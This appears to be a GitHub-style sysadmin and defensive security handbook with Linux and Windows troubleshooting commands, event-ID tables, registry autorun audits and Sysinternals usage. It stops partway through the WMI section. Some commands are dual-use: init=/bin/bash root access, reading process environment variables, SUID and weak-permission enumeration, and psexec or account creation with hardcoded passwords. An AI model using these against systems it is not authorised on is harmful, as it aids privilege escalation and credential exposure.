# 🛡️ The Ultimate SysAdmin & Defensive Security Compendium

> A comprehensive, GitHub-style knowledge base covering deep OS troubleshooting, defensive cybersecurity, tool configurations, hardening checklists, and OPSEC best practices — inspired by [h4cker](https://github.com/The-Art-of-Hacking/h4cker), [personal-security-checklist](https://github.com/Lissy93/personal-security-checklist), and [SafeLine WAF](https://github.com/chaitin/SafeLine).

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Maintained: Yes](https://img.shields.io/badge/Maintained%3F-yes-green.svg)](https://github.com/asbinthapa99/Cyber-things)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequest.com)
[![Documentation](https://img.shields.io/badge/docs-comprehensive-blue.svg)]()

---

## 📚 Table of Contents

- [1. Linux Deep-Dive Troubleshooting](#1-linux-deep-dive-troubleshooting)
  - [1.1 System Boot & Kernel Diagnostics](#11-system-boot--kernel-diagnostics)
  - [1.2 Process & Memory Analysis](#12-process--memory-analysis)
  - [1.3 Network Diagnostics](#13-network-diagnostics)
  - [1.4 Storage & Filesystem Forensics](#14-storage--filesystem-forensics)
  - [1.5 systemd & Service Debugging](#15-systemd--service-debugging)
  - [1.6 Performance Profiling](#16-performance-profiling)
  - [1.7 Log Analysis & Journalctl Mastery](#17-log-analysis--journalctl-mastery)
- [2. Windows Deep-Dive Troubleshooting](#2-windows-deep-dive-troubleshooting)
  - [2.1 PowerShell Administration](#21-powershell-administration)
  - [2.2 Event Viewer & Windows Logs](#22-event-viewer--windows-logs)
  - [2.3 Registry Troubleshooting](#23-registry-troubleshooting)
  - [2.4 Sysinternals Suite](#24-sysinternals-suite)
  - [2.5 WMI & CIM Queries](#25-wmi--cim-queries)
  - [2.6 Windows Networking Diagnostics](#26-windows-networking-diagnostics)
- [3. macOS Deep-Dive Troubleshooting](#3-macos-deep-dive-troubleshooting)
  - [3.1 log show & Unified Logging](#31-log-show--unified-logging)
  - [3.2 LaunchDaemon & LaunchAgent Debugging](#32-launchdaemon--launchagent-debugging)
  - [3.3 Network Configuration Fixes](#33-network-configuration-fixes)
  - [3.4 DTrace & Instruments](#34-dtrace--instruments)
  - [3.5 macOS Recovery & FileVault](#35-macos-recovery--filevault)
- [4. Defensive Cybersecurity & Vulnerability Theory](#4-defensive-cybersecurity--vulnerability-theory)
  - [4.1 SQL Injection (SQLi)](#41-sql-injection-sqli)
  - [4.2 Cross-Site Scripting (XSS)](#42-cross-site-scripting-xss)
  - [4.3 Buffer Overflow](#43-buffer-overflow)
  - [4.4 CSRF & SSRF](#44-csrf--ssrf)
  - [4.5 Command Injection](#45-command-injection)
  - [4.6 Insecure Deserialization](#46-insecure-deserialization)
  - [4.7 XXE Injection](#47-xxe-injection)
  - [4.8 Path Traversal](#48-path-traversal)
  - [4.9 IDOR & Broken Access Control](#49-idor--broken-access-control)
  - [4.10 Race Conditions & TOCTOU](#410-race-conditions--toctou)
  - [4.11 Cryptographic Weaknesses](#411-cryptographic-weaknesses)
  - [4.12 Supply Chain Attacks](#412-supply-chain-attacks)
- [5. Security Tools & Implementation](#5-security-tools--implementation)
  - [5.1 Web Application Firewalls (WAF)](#51-web-application-firewalls-waf)
  - [5.2 Intrusion Detection Systems (IDS/IPS)](#52-intrusion-detection-systems-idsips)
  - [5.3 SIEM Setup](#53-siem-setup)
  - [5.4 Vulnerability Scanners](#54-vulnerability-scanners)
  - [5.5 Endpoint Detection & Response (EDR)](#55-endpoint-detection--response-edr)
  - [5.6 Network Monitoring Tools](#56-network-monitoring-tools)
  - [5.7 Password Managers & Secrets Management](#57-password-managers--secrets-management)
  - [5.8 VPN & Secure Tunneling](#58-vpn--secure-tunneling)
  - [5.9 Threat Intelligence Platforms](#59-threat-intelligence-platforms)
- [6. OS Hardening Guides](#6-os-hardening-guides)
  - [6.1 Linux Server Hardening](#61-linux-server-hardening)
  - [6.2 Windows Server Hardening](#62-windows-server-hardening)
  - [6.3 macOS Hardening](#63-macos-hardening)
- [7. Personal & Enterprise Security Checklists](#7-personal--enterprise-security-checklists)
  - [7.1 Personal Device Security](#71-personal-device-security)
  - [7.2 Browser Privacy Checklist](#72-browser-privacy-checklist)
  - [7.3 Email Security Checklist](#73-email-security-checklist)
  - [7.4 Network Security Checklist](#74-network-security-checklist)
  - [7.5 Physical Security Checklist](#75-physical-security-checklist)
  - [7.6 OPSEC Best Practices](#76-opsec-best-practices)
  - [7.7 Enterprise Security Checklist](#77-enterprise-security-checklist)
- [8. Cloud Security](#8-cloud-security)
  - [8.1 AWS Security](#81-aws-security)
  - [8.2 GCP Security](#82-gcp-security)
  - [8.3 Azure Security](#83-azure-security)
- [9. Container & Kubernetes Security](#9-container--kubernetes-security)
- [10. Secure Development Practices](#10-secure-development-practices)
- [11. Incident Response Playbooks](#11-incident-response-playbooks)
- [12. Threat Modeling](#12-threat-modeling)
- [13. Compliance & Frameworks](#13-compliance--frameworks)
- [14. Reference Tables & Cheat Sheets](#14-reference-tables--cheat-sheets)
- [15. License](#15-license)

---

## 1. Linux Deep-Dive Troubleshooting

### 1.1 System Boot & Kernel Diagnostics

#### Kernel Panic Analysis

A kernel panic is Linux's equivalent of a Windows BSOD. The kernel encounters an unrecoverable error and halts the system. Understanding the panic output is critical.

**Viewing Kernel Ring Buffer:**
```bash
# View kernel messages (ring buffer)
dmesg | less
dmesg -T          # Human-readable timestamps
dmesg --level=err,crit,alert,emerg    # Filter by severity
dmesg | grep -i "error\|fail\|panic\|oops\|warn" | tail -50

# Kernel logs from last boot (systemd systems)
journalctl -k                    # Kernel messages this boot
journalctl -k -b -1              # Kernel messages from previous boot
journalctl -k -b -1 --priority=err  # Only errors from last boot
```

**Analyzing a Kernel Oops/Panic:**
```bash
# After a crash, check saved crash dumps
ls /var/crash/
ls /var/log/

# If kdump is configured, analyze vmcore
crash /usr/lib/debug/boot/vmlinux-$(uname -r) /var/crash/$(ls /var/crash/ | tail -1)/vmcore

# Within crash utility
> bt        # backtrace
> log       # kernel log buffer
> ps        # process list at crash time
> vm        # virtual memory info
> files     # open files
```

**Configuring kdump for Post-Crash Analysis:**
```bash
# Install kdump
sudo apt install kdump-tools linux-crashdump   # Debian/Ubuntu
sudo dnf install kexec-tools                   # RHEL/Fedora

# Edit grub to reserve memory for crash kernel
# In /etc/default/grub:
GRUB_CMDLINE_LINUX="crashkernel=256M"

sudo update-grub
sudo systemctl enable kdump
sudo systemctl start kdump

# Verify kdump is ready
sudo kdump-config status
cat /sys/kernel/kexec_crash_loaded   # Should show "1"
```

**Boot Troubleshooting from GRUB:**
```bash
# At GRUB menu, press 'e' to edit boot entry
# Add these kernel parameters for verbose output:
# Remove: quiet splash
# Add:    debug loglevel=7 systemd.log_level=debug

# For read-only root causing issues, add:
# rw init=/bin/bash

# Rescue mode via systemd
# Add to kernel line: systemd.unit=rescue.target
# Or: rd.break   (break into initramfs)
```

**GRUB Recovery:**
```bash
# If GRUB is broken, boot from Live USB and:
sudo mount /dev/sda2 /mnt            # Mount root partition
sudo mount /dev/sda1 /mnt/boot       # Mount boot partition
sudo mount --bind /dev /mnt/dev
sudo mount --bind /proc /mnt/proc
sudo mount --bind /sys /mnt/sys
sudo chroot /mnt

# Reinstall GRUB
grub-install /dev/sda
update-grub
exit

# Unmount and reboot
sudo umount -R /mnt
```

---

### 1.2 Process & Memory Analysis

#### strace — System Call Tracer

`strace` intercepts and records system calls made by a process. It's invaluable for debugging application failures without source code.

```bash
# Trace a command
strace ls /tmp

# Trace an existing process
strace -p 1234

# Trace with timestamps (microseconds)
strace -T -tt ls /tmp

# Trace only specific syscalls
strace -e trace=open,read,write ls /tmp
strace -e trace=network curl https://example.com
strace -e trace=file,process ls /tmp

# Follow child processes (fork/exec)
strace -f -p 1234

# Save output to file
strace -o /tmp/strace_output.txt -f myapp

# Count syscall statistics
strace -c ls /tmp

# Trace memory allocation calls
strace -e trace=brk,mmap,munmap,mprotect myapp

# Decode strings (show more bytes)
strace -s 1024 curl https://example.com
```

**Interpreting strace output:**
```
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
# ^syscall     ^argument                                    ^return value (fd=3)

read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\34\2\0\0\0\0\0"..., 832) = 832
# fd=3, reading ELF header, 832 bytes read

openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libm.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
# ERROR: library not found — this is a problem!
```

#### Process Investigation

```bash
# List all processes with full details
ps auxf                      # Forest/tree view
ps aux --sort=-%cpu          # Sort by CPU
ps aux --sort=-%mem          # Sort by memory
ps -eo pid,ppid,cmd,pcpu,pmem --sort=-pcpu | head

# Process tree
pstree -p                    # Show PIDs
pstree -aup                  # Show arguments, users, PIDs

# Real-time process monitoring
top
htop                         # Enhanced (install: apt install htop)
btop                         # Beautiful (install: apt install btop)
glances                      # System-wide (install: pip install glances)

# Find processes by name or file
pgrep -la nginx
pidof sshd
fuser 80/tcp                 # What process is using port 80?
lsof -i :80                  # Detailed info for port 80
lsof -p 1234                 # All files open by PID 1234
lsof -u username             # All files by user
lsof +D /var/log             # All processes accessing directory

# Process limits
cat /proc/1234/limits
ulimit -a                    # Current shell limits

# Inspect a running process
cat /proc/1234/cmdline | tr '\0' ' '    # Command line
cat /proc/1234/environ | tr '\0' '\n'   # Environment variables
ls -la /proc/1234/fd                    # Open file descriptors
cat /proc/1234/status                   # Process status
cat /proc/1234/maps                     # Memory maps
cat /proc/1234/net/tcp                  # Network connections
```

#### Memory Analysis

```bash
# Overview
free -h                          # Human readable
vmstat 1 5                       # Virtual memory stats (every 1s, 5 times)
cat /proc/meminfo                # Detailed memory info

# Memory usage per process
smem -r -s rss | head -20        # Sort by RSS
ps aux --sort=-%mem | head -10

# OOM Killer — find what got killed
dmesg | grep -i "oom\|out of memory\|killed process"
journalctl -k | grep -i oom | tail -20

# Memory leak detection
valgrind --leak-check=full --show-leak-kinds=all ./myapp

# Shared memory
ipcs -m                          # Shared memory segments
ipcs -a                          # All IPC resources

# NUMA analysis (multi-socket servers)
numactl --hardware
numastat -p myapp

# Huge pages
cat /proc/meminfo | grep -i huge
grep -r HugePages /proc/sys/vm/

# Swap analysis
swapon --show
cat /proc/swaps
vmstat -s | grep -i swap
```

---

### 1.3 Network Diagnostics

#### tcpdump — The Network Packet Analyzer

```bash
# Basic capture on interface
sudo tcpdump -i eth0

# Capture with verbose output and no DNS resolution
sudo tcpdump -i eth0 -nn -vv

# Capture specific host traffic
sudo tcpdump -i eth0 host 192.168.1.100

# Capture specific port
sudo tcpdump -i eth0 port 443
sudo tcpdump -i eth0 port 80 or port 443

# Capture and save to file
sudo tcpdump -i eth0 -w /tmp/capture.pcap

# Read from pcap file
sudo tcpdump -r /tmp/capture.pcap

# Capture HTTP traffic
sudo tcpdump -i eth0 -A -s 0 port 80

# Capture DNS queries
sudo tcpdump -i eth0 -n port 53

# Capture ICMP (ping)
sudo tcpdump -i eth0 icmp

# Capture SYN packets (connection attempts)
sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'

# Capture large packets (potential issues)
sudo tcpdump -i eth0 'greater 1400'

# Limit capture size and count
sudo tcpdump -i eth0 -c 100 -s 65535 -w capture.pcap

# Show packet hex and ASCII
sudo tcpdump -i eth0 -XX port 25

# Capture traffic to/from a subnet
sudo tcpdump -i eth0 net 192.168.1.0/24
```

#### Advanced Network Diagnostics

```bash
# ss — socket statistics (modern netstat replacement)
ss -tlnp                   # TCP listening ports with processes
ss -ulnp                   # UDP listening ports
ss -s                      # Summary statistics
ss -anp | grep :80         # All connections on port 80
ss -tnp state ESTABLISHED  # Established TCP connections
ss -o state FIN-WAIT-1     # Connections in FIN-WAIT-1

# netstat (legacy but still useful)
netstat -tlnp              # TCP listening
netstat -s                 # Statistics by protocol
netstat -rn                # Routing table

# ip command suite
ip addr show               # Interface addresses
ip link show               # Link status
ip route show              # Routing table
ip route get 8.8.8.8       # How to reach an IP
ip neigh show              # ARP cache
ip -s link                 # Interface statistics

# Trace the route
traceroute google.com
traceroute -T -p 443 google.com   # TCP traceroute
mtr google.com                    # Real-time traceroute
tracepath google.com              # Path MTU discovery

# DNS diagnostics
dig google.com
dig google.com @8.8.8.8           # Query specific DNS server
dig +trace google.com             # Full DNS resolution trace
dig -x 8.8.8.8                    # Reverse lookup
nslookup google.com
resolvectl query google.com       # systemd-resolved

# Bandwidth testing
iperf3 -s                          # Server mode
iperf3 -c 192.168.1.1 -t 30       # Client, 30 second test
iperf3 -c 192.168.1.1 -u -b 100M  # UDP test at 100Mbit

# Connection testing
nc -zv 192.168.1.1 22             # TCP port check
nc -zvw3 192.168.1.1 80           # With 3s timeout
curl -v telnet://192.168.1.1:22   # Via curl
nmap -p 22,80,443 192.168.1.1     # Port scan

# Firewall status
sudo iptables -L -n -v --line-numbers
sudo nft list ruleset
sudo ufw status verbose
sudo firewall-cmd --list-all      # firewalld
```

---

### 1.4 Storage & Filesystem Forensics

```bash
# Disk usage overview
df -hT                             # Human-readable with filesystem type
du -sh /var/log/*                  # Size of each item in directory
du -ah /home | sort -rh | head -20 # Top 20 largest files/dirs
ncdu /                             # Interactive disk usage (install: apt install ncdu)

# Disk health (SMART)
sudo smartctl -a /dev/sda
sudo smartctl -t short /dev/sda    # Run short self-test
sudo smartctl -t long /dev/sda     # Run long self-test (hours)
sudo smartctl -H /dev/sda          # Health check only

# I/O performance
iostat -xz 1                       # Extended I/O stats every 1s
iotop -ao                          # I/O by process (accumulated)
pidstat -d 1                       # Per-process I/O

# Filesystem checks
sudo fsck /dev/sda1                # Check and repair (unmounted!)
sudo fsck -n /dev/sda1             # Dry-run, no changes
sudo e2fsck -fv /dev/sda1          # Extended check with verbose
tune2fs -l /dev/sda1               # ext4 filesystem details

# LVM troubleshooting
pvs                                # Physical volumes
vgs                                # Volume groups
lvs                                # Logical volumes
pvdisplay
vgdisplay
lvdisplay
vgscan --cache                     # Rescan for volume groups

# RAID status
cat /proc/mdstat                   # Software RAID status
sudo mdadm --detail /dev/md0
sudo mdadm --query /dev/sda

# Find recently modified files (useful for incident response)
find / -mtime -1 -type f 2>/dev/null | head -50    # Last 24h
find /etc -newer /etc/passwd -type f               # Newer than passwd
find / -perm -4000 -type f 2>/dev/null             # SUID files
find / -perm -2000 -type f 2>/dev/null             # SGID files
find /tmp /var/tmp -type f -executable 2>/dev/null # Executables in /tmp

# Inode exhaustion (files present but can't create new)
df -i                              # Inode usage
find / -xdev -type f | wc -l      # Count all files on filesystem

# Deleted but open files (files holding disk space)
lsof | grep "(deleted)"
lsof +L1                           # Links=0 (deleted but open)
```

---

### 1.5 systemd & Service Debugging

```bash
# Service management
sudo systemctl status myservice
sudo systemctl start|stop|restart|reload myservice
sudo systemctl enable|disable myservice
sudo systemctl daemon-reload               # After editing unit files
sudo systemctl reset-failed                # Clear failed state

# Detailed service debugging
sudo systemctl status -l myservice         # Full log output
sudo journalctl -u myservice -f            # Follow logs
sudo journalctl -u myservice --since "1 hour ago"
sudo journalctl -u myservice -n 100        # Last 100 lines
sudo journalctl -u myservice -p err        # Only errors

# List all units
systemctl list-units --type=service
systemctl list-units --state=failed
systemctl list-unit-files --state=enabled

# Boot performance analysis
systemd-analyze                            # Total boot time
systemd-analyze blame                      # Time per unit
systemd-analyze critical-chain             # Critical path
systemd-analyze plot > boot.svg            # Graphical boot chart

# Unit file locations
# /etc/systemd/system/         → Custom/override units (highest priority)
# /usr/lib/systemd/system/     → Package-installed units
# /run/systemd/system/         → Runtime units

# Creating a simple service unit file
cat > /etc/systemd/system/myapp.service << 'EOF'
[Unit]
Description=My Application
After=network.target
Requires=network.target

[Service]
Type=simple
User=myappuser
Group=myappuser
WorkingDirectory=/opt/myapp
ExecStart=/opt/myapp/bin/myapp --config /etc/myapp/config.yaml
ExecReload=/bin/kill -HUP $MAINPID
Restart=on-failure
RestartSec=5s
StartLimitInterval=60s
StartLimitBurst=3

# Security hardening
NoNewPrivileges=yes
PrivateTmp=yes
ProtectSystem=strict
ProtectHome=yes
ReadWritePaths=/var/log/myapp

# Resource limits
LimitNOFILE=65536
MemoryMax=512M
CPUQuota=50%

# Environment
Environment="NODE_ENV=production"
EnvironmentFile=-/etc/myapp/environment

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable --now myapp

# systemd drop-in overrides (non-destructive)
sudo systemctl edit myservice
# Creates /etc/systemd/system/myservice.service.d/override.conf
# Example override to add environment variable:
# [Service]
# Environment="DEBUG=1"

# Viewing drop-in files
sudo systemctl cat myservice
```

---

### 1.6 Performance Profiling

```bash
# CPU profiling with perf
sudo perf top                          # Live CPU profiler
sudo perf record -g ./myapp            # Record with call graphs
sudo perf report                       # View recording
sudo perf stat ./myapp                 # Run and collect stats
sudo perf stat -e cache-misses,cycles,instructions ./myapp

# CPU frequency and throttling
cat /sys/devices/system/cpu/cpu*/cpufreq/scaling_cur_freq
cpupower frequency-info
cpupower monitor

# Load average interpretation
uptime
# load average: 1.23, 0.87, 0.65
# 1-min, 5-min, 15-min load averages
# On a 4-core system: load of 4.0 = 100% utilization

# Detect CPU throttling due to temperature
cat /sys/class/thermal/thermal_zone*/temp
sensors                                # Install: apt install lm-sensors
sudo turbostat --quiet                 # Intel CPU stats

# I/O wait diagnosis
vmstat 1 | awk '{print $15}'          # wa column (I/O wait %)
iostat -x 1 | grep -E "Device|sda"

# System call overhead — ftrace
echo function > /sys/kernel/debug/tracing/current_tracer
echo 1 > /sys/kernel/debug/tracing/tracing_on
cat /sys/kernel/debug/tracing/trace | head -50
echo 0 > /sys/kernel/debug/tracing/tracing_on

# eBPF tools (bpftools/bcc)
sudo bpftrace -e 'tracepoint:syscalls:sys_enter_open { printf("%s %s\n", comm, str(args->filename)); }'
sudo opensnoop-bpfcc                   # Trace file opens
sudo execsnoop-bpfcc                   # Trace process execution
sudo tcplife-bpfcc                     # TCP connection lifetimes
sudo biolatency-bpfcc                  # Block I/O latency histogram
```

---

### 1.7 Log Analysis & Journalctl Mastery

```bash
# journalctl — the master log viewer
journalctl                             # All logs (paginated)
journalctl -f                          # Follow (like tail -f)
journalctl -n 50                       # Last 50 lines
journalctl -r                          # Reverse order (newest first)
journalctl -p err                      # Priority: emerg,alert,crit,err,warning,notice,info,debug
journalctl -p 0..3                     # emerg to err
journalctl --since "2024-01-01 00:00:00"
journalctl --since "1 hour ago" --until "30 min ago"
journalctl --since yesterday
journalctl -u sshd --since today       # Service + time filter
journalctl _PID=1234                   # By PID
journalctl _UID=1000                   # By user ID
journalctl _SYSTEMD_UNIT=nginx.service # By unit
journalctl -b                          # Current boot
journalctl -b -1                       # Previous boot
journalctl --list-boots                # List all boots
journalctl -k                          # Kernel messages only
journalctl -o json-pretty              # JSON output
journalctl -o verbose                  # All fields
journalctl --disk-usage                # Log disk usage
sudo journalctl --vacuum-size=500M     # Trim logs to 500M
sudo journalctl --vacuum-time=30d      # Remove logs older than 30 days

# Traditional log files
tail -f /var/log/syslog
tail -f /var/log/auth.log              # Authentication attempts
tail -f /var/log/kern.log              # Kernel messages
grep -i "failed\|error\|denied" /var/log/auth.log

# Log analysis with awk and grep
# Find all failed SSH attempts
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -20

# Find all successful SSH logins
grep "Accepted password\|Accepted publickey" /var/log/auth.log | awk '{print $9, $11}' | sort | uniq -c

# Web server log analysis
awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -20  # Top IPs
awk '{print $7}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -20  # Top URLs
awk '$9 >= 500' /var/log/nginx/access.log | wc -l                                   # 5xx errors

# Using logwatch
sudo logwatch --output stdout --format text --range today --detail high
```

---

## 2. Windows Deep-Dive Troubleshooting

### 2.1 PowerShell Administration

```powershell
# System Information
Get-ComputerInfo
Get-WmiObject Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber
systeminfo | findstr /C:"OS Name" /C:"System Type" /C:"Total Physical Memory"
[Environment]::OSVersion

# Process Management
Get-Process | Sort-Object CPU -Descending | Select-Object -First 20
Get-Process | Where-Object {$_.WorkingSet -gt 500MB} | Select Name, Id, @{N="MB";E={$_.WorkingSet/1MB}}
Stop-Process -Name notepad -Force
Start-Process notepad.exe -Verb RunAs    # Run as admin

# Service Management
Get-Service | Where-Object {$_.Status -eq "Stopped"} | Select Name, DisplayName
Get-Service -Name wuauserv | Start-Service
Set-Service -Name wuauserv -StartupType Automatic
Get-Service -DependentServices -Name Spooler  # Services that depend on Spooler

# Network Diagnostics
Get-NetAdapter | Select Name, Status, LinkSpeed
Test-NetConnection -ComputerName google.com -Port 443
Test-NetConnection -TraceRoute google.com
Get-NetTCPConnection | Where-Object State -EQ Established | Select LocalAddress, LocalPort, RemoteAddress, RemotePort
Get-NetIPConfiguration
Resolve-DnsName google.com
Resolve-DnsName -Name google.com -Server 8.8.8.8

# User and Group Management
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember -Group "Administrators"
New-LocalUser -Name "newuser" -Password (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force) -FullName "New User"
Add-LocalGroupMember -Group "Administrators" -Member "newuser"

# Disk and Storage
Get-Disk
Get-Partition
Get-Volume
Get-PhysicalDisk | Select FriendlyName, MediaType, HealthStatus, OperationalStatus, Size
Repair-Volume -DriveLetter C -Scan   # Check disk without repair
Repair-Volume -DriveLetter C -OfflineScanAndFix

# File System Search
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -like "*.log"} | Select FullName, LastWriteTime
Get-ChildItem -Path C:\Windows\Prefetch -Filter *.pf | Sort-Object LastWriteTime -Descending | Select-Object -First 20

# Windows Update
Get-WindowsUpdateLog
Install-Module PSWindowsUpdate -Force
Get-WindowsUpdate
Install-WindowsUpdate -AcceptAll -AutoReboot

# Registry Operations (PowerShell)
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name ProductName
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "MaxUserPort" -Value 65534
New-Item -Path "HKLM:\SOFTWARE\MyApp" -Force
Remove-Item -Path "HKLM:\SOFTWARE\MyApp" -Recurse

# Event Log Queries
Get-EventLog -LogName System -EntryType Error -Newest 50
Get-EventLog -LogName Application -Source "Application Error" -Newest 20
Get-WinEvent -FilterHashtable @{LogName='System'; Level=2; StartTime=(Get-Date).AddDays(-1)}
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} | Select -First 20  # Failed logons

# Remote Management
Enter-PSSession -ComputerName SERVERNAME -Credential (Get-Credential)
Invoke-Command -ComputerName SERVER1, SERVER2 -ScriptBlock { Get-Service | Where Status -eq Running }
```

---

### 2.2 Event Viewer & Windows Logs

#### Key Event IDs Reference

| Event ID | Log | Description |
|----------|-----|-------------|
| 4624 | Security | Successful logon |
| 4625 | Security | Failed logon attempt |
| 4634 | Security | Logon session ended |
| 4648 | Security | Logon with explicit credentials |
| 4672 | Security | Special privileges assigned (admin logon) |
| 4698 | Security | Scheduled task created |
| 4720 | Security | User account created |
| 4726 | Security | User account deleted |
| 4732 | Security | Member added to security group |
| 4740 | Security | User account locked out |
| 4756 | Security | Member added to universal group |
| 4768 | Security | Kerberos TGT requested |
| 4769 | Security | Kerberos service ticket requested |
| 4771 | Security | Kerberos pre-authentication failed |
| 4776 | Security | NTLM authentication attempted |
| 7034 | System | Service crashed unexpectedly |
| 7035 | System | Service sent start/stop control |
| 7036 | System | Service started or stopped |
| 7045 | System | New service installed |
| 1102 | Security | Audit log cleared (suspicious!) |
| 4688 | Security | Process created (enable auditing) |
| 4689 | Security | Process terminated |

```powershell
# Query security log for suspicious events
# Failed logons from last 24 hours
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 4625
    StartTime = (Get-Date).AddHours(-24)
} | Select-Object TimeCreated, @{N="Username";E={$_.Properties[5].Value}}, @{N="SourceIP";E={$_.Properties[19].Value}}

# Detect log clearing (major red flag)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=1102} | Select TimeCreated, Message

# Scheduled task creation (persistence mechanism)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4698} | Select TimeCreated, Message | Format-List

# New service installation (malware indicator)
Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} | Select TimeCreated, @{N="ServiceName";E={$_.Properties[0].Value}}

# Export logs for analysis
wevtutil epl Security C:\Logs\Security.evtx
wevtutil epl System C:\Logs\System.evtx

# Query without PowerShell (command line)
wevtutil qe Security /q:"*[System[(EventID=4625)]]" /c:50 /rd:true /f:text
```

---

### 2.3 Registry Troubleshooting

#### Critical Registry Locations

```
HKEY_LOCAL_MACHINE (HKLM) — Machine-wide settings
HKEY_CURRENT_USER (HKCU)  — Current user settings
HKEY_USERS (HKU)          — All user profiles
HKEY_CLASSES_ROOT (HKCR)  — File type associations
HKEY_CURRENT_CONFIG (HKCC)— Current hardware profile
```

```
# Autorun locations (malware persistence spots - AUDIT THESE)
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\SYSTEM\CurrentControlSet\Services  (service-based persistence)
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon  (Userinit, Shell)

# Services
HKLM\SYSTEM\CurrentControlSet\Services\

# Network configuration
HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters

# Installed software
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall  (32-bit on 64-bit)

# User-specific installed software
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall

# Browser helpers and extensions (audit for malware)
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects
```

```powershell
# Audit all autorun locations
$autorunLocations = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
)

foreach ($location in $autorunLocations) {
    Write-Host "=== $location ===" -ForegroundColor Cyan
    Get-ItemProperty -Path $location -ErrorAction SilentlyContinue | 
        Select-Object * -ExcludeProperty PS* | 
        Format-List
}

# Export registry hive for offline analysis
reg export HKLM\SOFTWARE C:\Backup\software_hive.reg
reg export HKCU C:\Backup\user_hive.reg

# Compare registry for changes
reg export HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run before.reg
# ...make changes...
reg export HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run after.reg
fc before.reg after.reg

# Search registry (important for incident response)
reg query HKLM /f "suspicious_string" /s /t REG_SZ  # Recursive string search
```

---

### 2.4 Sysinternals Suite

The [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/) is an indispensable collection of Windows utilities.

```powershell
# Download Sysinternals Suite
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/SysinternalsSuite.zip" -OutFile "C:\Tools\Sysinternals.zip"
Expand-Archive -Path "C:\Tools\Sysinternals.zip" -DestinationPath "C:\Tools\Sysinternals"

# Or run directly from web (requires internet)
# \\live.sysinternals.com\tools\
```

**Process Monitor (procmon.exe)** — Real-time file, registry, and process activity
```
# Use cases:
# - Track which registry keys an app reads
# - Find which files a process is accessing
# - Debug "Access Denied" errors
# - Trace DLL loading issues

# Key filters:
# Process Name → contains → myapp.exe
# Result → contains → DENIED
# Path → ends with → .dll
```

**Process Explorer (procexp.exe)** — Enhanced Task Manager
```
# Features:
# - Show full DLL list for each process
# - Check VirusTotal for any process/DLL
# - Show handles (open files, sockets)
# - Highlight color coding:
#   Purple  = packed/compressed image
#   Red     = process exiting
#   Green   = new process
#   Blue    = runs in same context as Explorer
```

**Autoruns (autoruns.exe)** — Show all autostart entries
```
# Most comprehensive autorun viewer
# Integrates with VirusTotal
# Highlights entries with no publisher (suspicious)
# Categories: Logon, Explorer, Services, Drivers, Boot Execute, etc.
```

```powershell
# Autorunsc (command-line Autoruns)
autorunsc.exe -a * -c -h -s -v > C:\autoruns_output.csv    # All locations, CSV, hash, VirusTotal

# PsExec — Run commands on remote systems
psexec.exe \\REMOTEPC ipconfig /all
psexec.exe \\REMOTEPC -u admin -p password cmd.exe

# TCPView — Live network connection viewer (GUI)
# Shows process, local/remote address, state

# Strings — Extract printable strings from binaries
strings.exe suspicious.exe > strings_output.txt
strings.exe -n 8 suspicious.exe    # Minimum 8 character strings

# Sigcheck — Verify file signatures
sigcheck.exe -v -vt suspicious.exe              # Check VirusTotal
sigcheck.exe -nobanner -v -vt -r C:\Windows\System32   # Scan directory

# Handle — Find which process has a file locked
handle.exe C:\Windows\locked_file.txt

# DU — Disk usage
du.exe -v C:\Windows

# AccessChk — Verify permissions
accesschk.exe -wvu "C:\Program Files"          # Writable dirs (privilege escalation risk)
accesschk.exe -uwcqv *                         # Services with weak permissions
```

---

### 2.5 WMI & CIM Queries

```powershell
# Comprehensive system inventory
Get-CimInstance Win32_ComputerSystem | Select Name, Manufacturer, Model, TotalPhysicalMemory
Get-CimInstance Win32_Processor | Select Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed
